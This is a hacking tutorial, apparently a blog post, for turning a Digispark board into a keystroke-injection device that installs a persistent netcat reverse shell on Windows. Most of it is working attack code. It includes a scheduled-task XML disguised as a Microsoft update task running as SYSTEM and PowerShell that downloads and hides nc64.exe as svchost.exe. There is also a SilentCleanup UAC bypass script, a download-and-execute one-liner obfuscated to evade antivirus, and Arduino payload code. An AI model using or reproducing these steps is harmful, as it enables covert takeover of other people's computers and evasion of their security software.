## Gain control on a computer in 3 seconds

#### As seen on Mr.Robot (S04x10)

![Mr Robot hodling Digispark](https://cdn.discordapp.com/attachments/914907771063894059/926024143202295828/IMG_0022.png)


**S**o, I made a rubber ducky with a small arduino board (called digispark-[[link here]](https://www.amazon.in/dp/B07B8SS1VQ/ref=cm_sw_r_cp_api_glt_fabc_MHJ6HENHA71NN6VZK0DE)).The original rubber duckies are pretty costly (for me anyway) [[link here]](https://shop.hak5.org/products/usb-rubber-ducky-deluxe). Sure they're fast and have more memory than digisparks, but making one our own will give us complete control of the board.We can configure the boot load times, make signals with on-board led etc.

## UAC bypass

UAC means 'User Account Control'. Yes, even if your computer has tight securities like when you try to install an app, the UAC dialogue box appears asking  a simple'Yes' or 'No'. We're going to bypass and go further.

![UAC prompt screen](https://cdn.discordapp.com/attachments/914907771063894059/925379076624113734/IMG_0014.jpg)

We'll also evade all major anti-virus applications using clever tricks.

## So how do we do this
Well, first of all you need to download netcat 1.12 [[link here]](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip) and extract the **nc64.exe.** Once you got it extracted upload it to some file-hosting service of your choice, which provides **DIRECT LINK** (very important!!). I used **Discord**, it works like a charm and link doesn't expire. Just upload the file to discord, right click on it and select copy media link.

&#x200B;

Second, you need to make yourself an **.XML** file which you'll need later for Task Scheduler. I believe scheduled tasks are really good way to set up persistence. It means our hack will always run in background even when the system restarts or anything. Scheduled tasks are also good for escalating the file that it executes to **NT Authority\\SYSTEM** privileges, while remaining stealthy. 

I already did the work for you.This is what it should look like.


    <?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>This will ensure system stability in case of an unexpected update interruption.</Description>
      </RegistrationInfo>
      <Triggers>
    <LogonTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </LogonTrigger>
      </Triggers>
      <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
      </Principals>
      <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
      </Settings>
      <Actions Context="Author">
    <Exec>
      <Command>%public%\audiosvc.exe</Command>
      <Arguments>(Your IP address without brackets) 4444 -e cmd.exe -d</Arguments>
    </Exec>
      </Actions>
    </TASK>



Just modify the arguments in the bottom with your **IP/PORT**. You can google how to find ip-address of your device.Once you got that done, save it and upload it for **DIRECT LINK**, just like you uploaded your previous file. 



&#x200B;

Now, that the boring setup part is over, we get to the actual code that's being executed to achieve this type of shell:

    cd $env:public
    $url1="YOUR_NC64_LINK"
    $url2="YOUR_XML_LINK"
    $path1="$env:public\svchost.exe"
    $path2="$env:public\x.xml"
    (new-object net.webclient).downloadfile($url1,$path1)
    (new-object net.webclient).downloadfile($url2,$path2)
    cmd /r 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f&reg add "HKCU\Environment" /v "windir" /d "%comspec% /r mode 18,1&cd %public%&schtasks /create /tn \"Windows Update Assistant\" /f /xml x.xml >nul&schtasks /run /tn \"Windows Update Assistant\" /i >nul&REM "&timeout /t 1&schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul&timeout /t 1&reg delete "HKCU\Environment" /v "windir" /F&attrib +s +h svchost.exe&del /q x.xml'

## Whats happening?

We're creating a persistent reverse shell(more about reverse shell [[link here]](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/)).

First, it downloads both of your files via powershell, then it clears our Windows + R history to clear any traces of itself (if you're using  USB RubberDucky). Then it uses the UAC bypass technique i shared at the end of this post to create scheduled task called **Windows Update Assistant**, which is set to be executed to run with **NT Authority\\SYSTEM** privileges(high level privileges or access) in our **.XML** file. Then it marks our **nc64.exe** file as hidden system file, which is also now called **svchost.exe** and then it deletes our **.XML** file, since system doesn't need it anymore after task is created.

&#x200B;

Now you're probably thinking, this is all nice, but how the hell do we run this in one-line of code?

Very simple, by invoking expression called **DownloadString** in powershell like this:

    powershell -nop -w 1 -c "iex (new-object net.webclient).downloadstring('YOUR_PASTEBIN_LINK')"

But problem with this one-liner is, that it gets picked up by most Anti-viruses as "malicious activity". Therefore, we need to obfuscate(hide) it a bit:

    cmd.exe /c powershell -nop -w 1 -c "iex (.('ne'+'w-ob'+'ject') ('ne'+'t.webc'+'lient')).('do'+'wnloadstr'+'ing').invoke(('Y'+'OUR_'+'PASTEBIN'))"

And there it is, this one liner will get you persistent reverse shell which will check for itself every minute if it's running and if it's not, then it executes itself silently in the background.

&#x200B;

## The UAC bypass technique

Bypassing highest UAC level [Windows 8,10,11]

&#x200B;

It's done by adding temporary Environment variable **windir** into **HKCU\\Environment** registry path.

There's an auto-elevated task called **SilentCleanup** and it's located in: **%windir%\\system32\\cleanmgr.exe** We can easily abuse this and elevate any file with Administrator privileges without prompting UAC (even highest level).

So let's say I'm gonna set **windir** to: "**cmd /k REM** "

And forcefully run **SilentCleanup** task:

    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

**REM** will tell it to ignore everything after **%windir%** and treat it just as a NOTE. Therefore just executing cmd with admin privs.

If you want to try this for yourself, here's a little batch script I made to elevate powershell:

    @echo off
    mode 18,1
    color FE
    reg add "HKCU\Environment" /v "windir" /d "cmd /c start powershell&REM " >nul
    timeout /t 2 >nul
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
    timeout /t 3 >nul
    reg delete "HKCU\Environment" /v "windir" /F

&#x200B;

## Wait i hacked my own system

You may be testing this on your own system. If you want to remove the reverse shell, copy the following code into a batch file( files ending with .bat extension on windows) and run it with administrator privilages.(right click on the bat file and click run-as-administrator).


    @echo off
    schtasks /end /tn "Windows Update Assistant" >nul
    schtasks /delete /tn "Windows Update Assistant" /f
    cd %public%
    attrib -s -h svchost.exe
    del /q svchost.exe
    timeout /t 1 >nul



&#x200B;


## Rubber ducky code

Digispark works with Arduino IDE, you can learn writing Arduino scripts on google.It's pretty simple and easy. You can learn how to setup Arduino IDE for digispark here [[Link]](https://maker.pro/arduino/projects/how-to-build-a-rubber-ducky-usb-with-arduino-using-a-digispark-module)

    #include "DigiKeyboard.h"

    void setup() {}

    void loop() {
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(3000);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("[code]");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
    }

Above code is simple and Works on any PC. Plug-in your digispark to PC and see the magic happen in 3 seconds.